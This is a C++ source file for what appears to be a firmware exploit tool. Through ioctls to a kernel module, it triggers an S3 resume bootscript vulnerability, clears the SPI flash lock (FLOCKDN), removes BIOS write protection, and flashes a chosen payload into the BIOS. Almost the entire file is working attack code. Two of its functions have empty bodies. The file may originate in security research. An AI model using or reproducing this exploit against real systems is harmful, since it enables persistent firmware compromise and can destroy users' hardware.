#include "exploit_module.hpp"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <cstring>
#include "s3exploit_ioctl.h"
#include "payload.hpp"
#include "log.hpp"
#include "file.hpp"
#include "flashrom.hpp"

static const char* DEVICE_PATH = "/dev/s3exploit";

ExploitModule::ExploitModule(int fd) : fd(fd) {}

ExploitModule::ExploitModule(ExploitModule&& other) : fd(other.fd) {
    other.fd = -1;
}

ExploitModule::~ExploitModule() {
    if (fd >= 0)
        ::close(fd);
}

Result<ExploitModule, int> ExploitModule::open() {
    int fd = ::open(DEVICE_PATH, O_RDWR);
    
    if (fd < 0)
        return Err(errno);

    return Ok(ExploitModule(fd));
}

Result<std::size_t, int> ExploitModule::get_bootscript_size() const noexcept {
    std::size_t size = 0;

    if (::ioctl(fd, S3EXPLOIT_GET_BOOTSCRIPT_SIZE, &size) < 0)
        return Err(errno);

    return Ok(size);
}

Result<std::string, int> ExploitModule::get_bootscript() const noexcept {
    auto size_opt = get_bootscript_size();
    if (!size_opt)
        return Err(size_opt.err());

    std::size_t size = (std::size_t) size_opt; 
    
    std::string bootscript(size, '\0');
    if (::ioctl(fd, S3EXPLOIT_GET_BOOTSCRIPT, bootscript.data()) < 0)
        return Err(errno);

    return Ok(bootscript);
}

Result<uint8_t*, int> ExploitModule::get_bootscript_addr() const noexcept {
    uint8_t* addr = nullptr;
    
    if (::ioctl(fd, S3EXPLOIT_GET_BOOTSCRIPT_ADDR, &addr) < 0)
        return Err(errno);

    return Ok(addr);
}

int ExploitModule::trigger_vuln(std::size_t wakeup_after) const noexcept {
    return ::ioctl(fd, S3EXPLOIT_TRIGGER_VULN, wakeup_after);
}

bool ExploitModule::is_vuln() const noexcept {
    int is_vuln = 0;

    if (::ioctl(fd, S3EXPLOIT_CHECK_IF_VULN, &is_vuln))
        return false;

    return is_vuln == 1;
}
    
Result<spi_flash_info, int> ExploitModule::get_flash_info(uint32_t what) const noexcept {
    spi_flash_info info;
    info.what = what;
   
    int status = ::ioctl(fd, S3EXPLOIT_GET_FLASH_INFO, &info);
    if (status < 0)
        return Err(errno);

    return Ok(info);

}

int ExploitModule::set_spi_flash_info(const spi_flash_info& info) const noexcept {
    if (::ioctl(fd, S3EXPLOIT_SET_FLASH_INFO, &info) < 0)
        return errno;

    return 0;
}
    
int ExploitModule::reset_flockdn_bit() const noexcept {
    if (::ioctl(fd, S3EXPLOIT_RESET_FLOCKDN_BIT) < 0)
        return errno;

    return 0;
}

int ExploitModule::overwrite_bios(const std::string& data, uint32_t offset) const noexcept {
    bios_overwrite_header ovr_header = {
        data.c_str(),
        data.length(),
        offset
    };
    
    if (::ioctl(fd, S3EXPLOIT_OVERWRITE_BIOS, &ovr_header) < 0)
        return errno;

    return 0;
}

constexpr const char* SANITY_CHECK_STR = "yes_I_want_a_brick";

uint32_t fetch_payload_number(uint32_t max) {
    log_info("Please choose payload to load:");
    uint32_t n;
    while (std::scanf("%u", &n) != 1 || n > max) {
        std::cin.ignore(std::numeric_limits<std::streamsize>::max(),'\n');

        if (!std::cin.good())
            exit(-1);

        log_error("Invalid input.\n");
        log_info("Please choose payload to load:");
    }
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(),'\n');
    return n;
}

bool ExploitModule::is_flash_unlocked() const noexcept {

}

int ExploitModule::flash_bios() const noexcept{

}

int ExploitModule::run() noexcept {
    int status;

    if (!is_vuln()) {
        log_error("Target is not vulnerable! exiting.\n");
        return -1;
    }
    log_ok("Target is vulnerable.\n");

    log_info("Modifying bootscript to reset FLOCKDN bit\n");
    status = reset_flockdn_bit();
    if (status) {
        log_error("Error cannot reset FLOCKDN bit error: %s\n", strerror(status));
        return -1;
    }

    status = trigger_vuln(2);
    if (status) {
        log_error("Cannot trigger vulnebrality error: %s\n", strerror(status));
        return -1;
    }
    
    auto spi_flash_info_opt = get_flash_info(SPI_FLASH_INFO_ALL);
    if (!spi_flash_info_opt) {
        log_error("Cannot fetch spi register error: %s\n", strerror(spi_flash_info_opt.err()));
        return -1;
    }
    spi_flash_info info = (spi_flash_info) spi_flash_info_opt;
    log_struct(info);

    if (info.hsfs & FLOCKDN) {
        log_error("Bit FLOCKDN is still set, exploit has failed, reason unknown\n");
        return -1;
    }

    log_info("Unlocking SPI ranges for write\n");
    for (std::size_t i=0; i < 5; ++i)
        info.pr[i] &= ~WRITE_PROTECTION;

    info.bios_cntl |= BIOSWE;

    info.what = SPI_FLASH_INFO_PR | SPI_FLASH_INFO_BIOS_CNTL;
    status = set_spi_flash_info(info);
    if (status) {
        log_error("Cannot unblock spi ranges error: %s\n", strerror(status));
        return -1;
    }
    spi_flash_info_opt = get_flash_info(SPI_FLASH_INFO_ALL);
    if (!spi_flash_info_opt) {
        log_error("Cannot refetch spi register error: %s\n", strerror(spi_flash_info_opt.err()));
        return -1;
    }
    info = (spi_flash_info) spi_flash_info_opt;
    log_struct(info);

    for (std::size_t i=0; i < 5; ++i) {
        if (info.pr[i] & WRITE_PROTECTION) {
            log_error("Write protection on region %lu is still set, exploit has failed, reason unknown\n", i);
            return -1;
        }
    }
    if ((info.bios_cntl & BIOSWE ) == 0) {
        log_error("Cannot set BIOSWE bit, exploit has failed, reason unknown\n");
        return -1;
    }

    log_ok("Exploit has succeded, bios is now unlocked!\n");

    auto payloads = fetch_payloads("payloads");

    if (payloads.size() == 0) {
        log_error("No payloads found exiting.\n");
        return -1;
    }
    log_ok("%d payloads loaded, choose one\n", payloads.size());
    
    std::size_t i=0;
    for (const auto & payload : payloads)
        log_info("%d name: %s, path: %s, offset: 0x%X\n", 
                i, payload.name.c_str(), payload.path.c_str(), payload.offset);

    auto payload_to_load = fetch_payload_number(payloads.size() - 1);

    const auto & payload = payloads[payload_to_load];
    auto patch_opt = read_file("payloads/" + payload.path);
    if (!patch_opt) {
        log_error("Cannot load file '%s' exiting\n",payload.path.c_str());
        return -1;
    }
    std::string patch = *patch_opt;

    auto flashrom = Flashrom::init(true);
    if (!flashrom) {
        log_error("Cannot init libflashrom.\n");
        return -1;
    }

    if (!flashrom->setup_programmer()) {
        log_error("Cannot init internal SPI programmer\n");
        return -1;
    }

    if (!flashrom->setup_flash_chip()) {
        log_error("Cannot init flash chip.\n");
        return -1;
    }

    if (!flashrom->setup_layout()) {
        log_error("Cannot setup flash layout.\n");
        return -1;
    }

    log_info("Flashsize: 0x%X\n", flashrom->flash_size());
    auto flash_data = flashrom->pad_to_flash_size(patch, payload.offset);

    log_info("This is the last step before flashing! Continue [Y/N]: ");
    std::string resp;
    if (!std::getline(std::cin, resp)) {
        log_error("std::getline failed std::cin is closed? exiting\n");
        return -1;
    }
    if (resp != "Y") {
        log_ok("Aborting...\n");
        return -1;
    }

    if (!flashrom->flash_bios(flash_data)) {
        log_error("Flashing failed your computer is now a red brick, enjoy.\n");
        return -1;
    }
    log_ok("BIOS flashed succesfully.\n");

    return 0;
}
